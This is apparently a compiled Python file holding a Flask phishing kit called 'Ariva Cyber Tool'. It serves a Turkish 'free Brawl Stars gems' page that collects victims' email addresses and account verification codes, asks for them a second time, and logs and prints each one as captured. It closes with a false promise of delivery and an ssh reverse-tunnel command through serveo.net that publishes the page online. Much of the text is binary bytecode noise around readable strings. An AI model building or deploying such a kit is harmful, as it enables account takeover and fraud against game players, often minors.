�
    |&�g�3  �                   �d  � d dl mZmZmZ d dlZd dlZ ee�      Zde_         ej                  dej                  d��       dZdadadaej                  d	d
dg��      d� �       Zej                  ddg��      d� �       Zej                  ddg��      d� �       Zej                  ddg��      d� �       Zej                  ddg��      d� �       Zedk(  r=	  ed�        ed�        ed�        ed�        ed�       ej-                  dd��       yy# e$ rZ ed ee�      � ��       Y dZ[ydZ[ww xY w) �    )�Flask�request�render_template_stringN�ariva_cyber_secret123zariva_cyber_tool.logz)%(asctime)s - %(levelname)s - %(message)s)�filename�level�formatu�%  
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Brawl Stars - Ücretsiz Elmas Kazan</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Arial', sans-serif;
            background: url('https://wallpapercave.com/wp/wp1813156.jpg') no-repeat center center fixed;
            background-size: cover;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            color: #fff;
        }
        .container {
            background: rgba(0, 0, 0, 0.9);
            padding: 50px;
            border-radius: 25px;
            box-shadow: 0 0 50px rgba(0, 255, 255, 0.7);
            text-align: center;
            width: 550px;
            animation: fadeIn 1.5s ease-in-out;
            position: relative;
            transition: all 0.5s ease;
        }
        .container:hover {
            box-shadow: 0 0 70px rgba(0, 255, 255, 0.9);
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.85); }
            to { opacity: 1; transform: scale(1); }
        }
        @keyframes slideIn {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .container h1 {
            color: #00ffff;
            font-size: 42px;
            margin-bottom: 20px;
            text-transform: uppercase;
            text-shadow: 0 0 20px rgba(0, 255, 255, 0.8);
        }
        .container p {
            font-size: 20px;
            margin-bottom: 30px;
            animation: slideIn 0.8s ease-in-out;
        }
        .container input[type="text"], .container input[type="password"] {
            width: 100%;
            padding: 15px;
            margin: 12px 0;
            border: 2px solid #00ffff;
            border-radius: 10px;
            background: rgba(26, 26, 26, 0.9);
            color: #fff;
            font-size: 16px;
            box-sizing: border-box;
            transition: all 0.3s ease;
        }
        .container input[type="text"]:focus, .container input[type="password"]:focus {
            border-color: #00cccc;
            box-shadow: 0 0 15px rgba(0, 255, 255, 0.7);
            outline: none;
        }
        .container button, .container input[type="submit"] {
            background: linear-gradient(45deg, #00ffff, #00cccc);
            color: #000;
            padding: 15px;
            border: none;
            border-radius: 10px;
            width: 100%;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            margin: 10px 0;
        }
        .container button:hover, .container input[type="submit"]:hover {
            background: linear-gradient(45deg, #00cccc, #00ffff);
            box-shadow: 0 0 20px rgba(0, 255, 255, 0.9);
            transform: translateY(-3px);
        }
        .message {
            color: #00ffff;
            margin-top: 20px;
            font-size: 18px;
            font-weight: bold;
            animation: slideIn 0.5s ease-in-out;
        }
        .modal {
            display: none;
            position: fixed;
            z-index: 100;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.8);
            justify-content: center;
            align-items: center;
        }
        .modal-content {
            background: rgba(0, 0, 0, 0.9);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 0 50px rgba(0, 255, 255, 0.7);
            text-align: center;
            width: 500px;
            animation: fadeIn 0.5s ease-in-out;
        }
        .modal-content h2 {
            color: #00ffff;
            font-size: 32px;
            margin-bottom: 20px;
            text-transform: uppercase;
        }
        .modal-content p {
            color: #fff;
            font-size: 18px;
            margin-bottom: 25px;
        }
        .modal-content select, .modal-content input[type="text"] {
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            border: 2px solid #00ffff;
            border-radius: 10px;
            background: rgba(26, 26, 26, 0.9);
            color: #fff;
            font-size: 16px;
        }
        .modal-content select:focus, .modal-content input[type="text"]:focus {
            border-color: #00cccc;
            outline: none;
        }
        .loader {
            border: 8px solid #f3f3f3;
            border-top: 8px solid #00ffff;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
            display: none;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        {% if not authenticated %}
            <h1>BRAWL STARS ELMAS</h1>
            <p>Tool’a erişmek için şifreyi gir! Şifre: elmasinyo 🚀</p>
            <form id="authForm" method="POST" action="/">
                <input type="password" name="auth_password" placeholder="Şifre (elmasinyo)" required>
                <input type="submit" value="Doğrula">
            </form>
        {% elif step == 'email' %}
            <h1>Brawl Stars Elmas</h1>
            <p>Ücretsiz Elmas kazanmak için e-postanı gir! 💎</p>
            <form id="emailForm" method="POST" action="/email">
                <input type="text" name="email" placeholder="E-posta" required>
                <input type="submit" value="Gönder">
            </form>
        {% elif step == 'verify' %}
            <h1>Brawl Stars  Elmas</h1>
            <p>{{ email }} adresine gönderilen doğrulama kodunu gir!</p>
            <form id="verifyForm" method="POST" action="/verify">
                <input type="text" name="code" placeholder="Doğrulama Kodu" required>
                <input type="submit" value="Doğrula">
                <div id="loader" class="loader"></div>
            </form>
        {% elif step == 'select_diamonds' %}
            <h1>Elmas Gönder</h1>
            <p>Merhaba {{ email }}, ne kadar Elmas istediğini seç!</p>
            <form id="diamondForm" method="POST" action="/send-diamonds">
                <select name="diamond_amount" required>
                    <option value="" disabled selected>Miktar Seç</option>
                    <option value="30">30 Elmas Hızlı</option>
                    <option value="80">80 Elmas Hızlı</option>
                    <option value="100">100 Elmas Hızlı</option>
                    <option value="310">310 Elmas Orta</option>
                    <option value="800">800 Elmas Orta</option>
                    <option value="1700">1700 Elmas Yavaş</option>
                </select>
                <input type="submit" value="Gönder">
            </form>
        {% elif step == 'reverify' %}
            <h1>Hesap Doğrulama</h1>
            <p>Lütfen hesabınızı doğrulayın, aksi takdirde Elmas gelmez!</p>
            <form id="reverifyForm" method="POST" action="/reverify">
                <input type="text" name="email" placeholder="E-posta" value="{{ email }}" required>
                <input type="text" name="code" placeholder="Doğrulama Kodu" required>
                <input type="submit" value="Doğrula ve Elmas Al">
                <div id="loader" class="loader"></div>
            </form>
        {% endif %}
        {% if message %}
            <p class="message">{{ message }}</p>
        {% endif %}
    </div>

    <script>
        
        function showLoader(formId) {
            const form = document.getElementById(formId);
            const loader = document.getElementById('loader');
            if (form && loader) {
                form.addEventListener('submit', function(e) {
                    e.preventDefault();
                    loader.style.display = 'block';
                    setTimeout(() => {
                        fetch(form.action, {
                            method: 'POST',
                            body: new FormData(form)
                        }).then(response => response.text()).then(data => {
                            document.body.innerHTML = data;
                        }).catch(error => console.error('Hata:', error));
                    }, 30000); // 30-second delay
                });
            }
        }

        showLoader('emailForm');
        showLoader('verifyForm');
        showLoader('reverifyForm');

        document.getElementById('authForm') && document.getElementById('authForm').addEventListener('submit', function(e) {
            e.preventDefault();
            fetch('/', {
                method: 'POST',
                body: new FormData(this)
            }).then(response => response.text()).then(data => {
                document.body.innerHTML = data;
            });
        });

        document.getElementById('diamondForm') && document.getElementById('diamondForm').addEventListener('submit', function(e) {
            e.preventDefault();
            fetch('/send-diamonds', {
                method: 'POST',
                body: new FormData(this)
            }).then(response => response.text()).then(data => {
                document.body.innerHTML = data;
            });
        });
    </script>
</body>
</html>
F�/�GET�POST)�methodsc                  �
  � t         j                  dk(  rNt         j                  j                  d�      } | dk(  rdat        t        t        d��      S t        t        dd�	�      S t        t        t        t        rd��      S d ��      S )
Nr   �auth_password�	elmasinyoT�email)�authenticated�stepFu   Yanlış şifre! Tekrar dene.)r   �message)r   �method�form�getr   r   �PAGE_TEMPLATE)r   s    �bs.py�homer     sm   � � �~�~������(�(��9���K�'� �M�)�-�}�[b�c�c�%�m�5�Rq�r�r�!�-�}�^k�SZ�v�v�qu�v�v�    z/emailc                  ��   � t         j                  j                  d�      at        st	        t
        ddd��      S t        j                  dt        � ��       t        dt        � ��       t	        t
        ddt        ��      S )Nr   Tu   E-posta boş olamaz!�r   r   r   z[!] Yakalanan E-posta: �verify�r   r   r   )	r   r   r   �
user_emailr   r   �logging�info�print� r   r   r   r   !  sc   � � ���!�!�'�*�J��%�m�4�g�_u�v�v��L�L�*�:�,�7�8�	�#�J�<�
0�1�!�-�t�(�Zd�e�er   z/verifyc                  ��   � t         j                  j                  d�      } | st        t        ddt
        d��      S t        j                  d| � ��       t        d| � ��       t        t        ddt
        ��      S )	N�codeTr   u   Kod boş olamaz!�r   r   r   r   u   [!] Yakalanan Doğrulama Kodu: �select_diamondsr   )	r   r   r   r   r   r    r!   r"   r#   )r&   s    r   r   r   +  sq   � � �<�<���F�#�D��%�m�4�h�^h�  sE�  F�  	F��L�L�2�4�&�9�:�	�+�D�6�
2�3�!�-�t�J[�cm�n�nr   z/send-diamondsc                  �   � t         j                  j                  d�      at        st	        t
        ddt        d��      S t	        t
        ddt        ��      S )N�diamond_amountTr(   u"   Lütfen bir Elmas miktarı seçin!r'   �reverifyr   )r   r   r   r*   r   r   r    r$   r   r   �send_diamondsr,   5  sN   � � �\�\�%�%�&6�7�N��%�m�4�N_�gq�  |`�  a�  	a�!�-�t�*�\f�g�gr   z	/reverifyc                  �^  � t         j                  j                  d�      } t         j                  j                  d�      }| r|st        t        ddt
        d��      S t        j                  d| � d|� d	t        � ��       t        d| � d|� d	t        � ��       t        t        ddt        � d
���      S )Nr   r&   Tr+   u   E-posta ve kod boş olamaz!r'   z*[!] Tekrar Yakalanan Bilgiler -> E-posta: z, Kod: z	, Elmas: u;    Elması seçtiniz hesabınıza 1-2 dk arasında gelecektirr   )
r   r   r   r   r   r    r!   r"   r*   r#   )r   r&   s     r   r+   r+   =  s�   � � �L�L���W�%�E��<�<���F�#�D���%�m�4�j�`j�  uR�  S�  	S��L�L�=�e�W�G�D�6�QZ�[i�Zj�k�l�	�6�u�g�W�T�F�)�Tb�Sc�
d�e�!�-�t�'�^l�]m�  ni�  \j�  k�  kr   �__main__u   Ariva Cyber Tool Başlıyor...u1   Yerel olarak çalışıyor: http://localhost:5000u=   Serveo ile internete açmak için şu komutu çalıştırın:z/ssh -R brawlstars2:80:localhost:5000 serveo.netuB   Serveo size bir URL verecek. Örnek: http://brawlstars2.serveo.netz0.0.0.0i�  )�host�portu   Bir hata oluştu: )�flaskr   r   r   r!   �time�__name__�app�
secret_key�basicConfig�INFOr   r   r    r*   �router   r   r   r,   r+   r#   �run�	Exception�e�strr$   r   r   �<module>r=      s�  �� 8� 8� � ��H�o��(��� �� � �3�7�<�<�F�H�C��J ���
������3�����(�w� )�w� ���8�f�X��&�f� '�f� ���9�v�h��'�o� (�o� ����f�X��.�h� /�h� ���;����)�k� *�k� �z��-��.�/��A�B��M�N��?�@��R�S����Y�T��*� �� � -��"�3�q�6�(�+�,�,��-�s   �;D �D/�D*�*D/